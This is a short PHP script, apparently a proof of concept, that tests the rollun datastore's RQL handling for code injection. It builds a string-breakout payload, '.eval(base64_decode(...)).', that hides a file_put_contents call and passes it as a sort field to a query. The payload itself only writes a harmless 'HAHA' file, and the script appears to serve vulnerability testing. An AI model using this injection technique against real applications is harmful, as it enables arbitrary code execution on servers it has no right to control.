<?php

use rollun\datastore\DataStore\ConditionBuilder\RqlConditionBuilder;


$dir = __DIR__;
echo "$dir\n";
chdir(dirname($dir));
require 'vendor/autoload.php';
require_once 'config/env_configurator.php';
/** @var \Interop\Container\ContainerInterface $container */
$container = require 'config/container.php';
\rollun\dic\InsideConstruct::setContainer($container);
$config = $container->get('config');

$datastore = new \rollun\datastore\DataStore\Memory();
//file_put_contents(\rollun\installer\Command::getDataDir() . "haha.dat", "HAHA")
$exploitString = "file_put_contents(\"data/haha.dat\", \"HAHA\");";
$base64 = base64_encode($exploitString);
$exploit = "'.eval(base64_decode('$base64')).'";
$datastore->create(["name" => "a"]);
$datastore->create(["name" => "b"]);
$datastore->create(["name" => "c"]);

//$exploit = "0.1e33";

$condBuilder = new RqlConditionBuilder();
$node = new \Xiag\Rql\Parser\Node\Query\ScalarOperator\EqNode("name",$exploit);
$query = new \Xiag\Rql\Parser\Query();
#$query->setQuery($node);
$query->setSort(new \Xiag\Rql\Parser\Node\SortNode([$exploit => \Xiag\Rql\Parser\Node\SortNode::SORT_DESC]));
$rql = \rollun\datastore\Rql\RqlParser::rqlEncode($query);
echo $rql;

$result = $datastore->query($query);


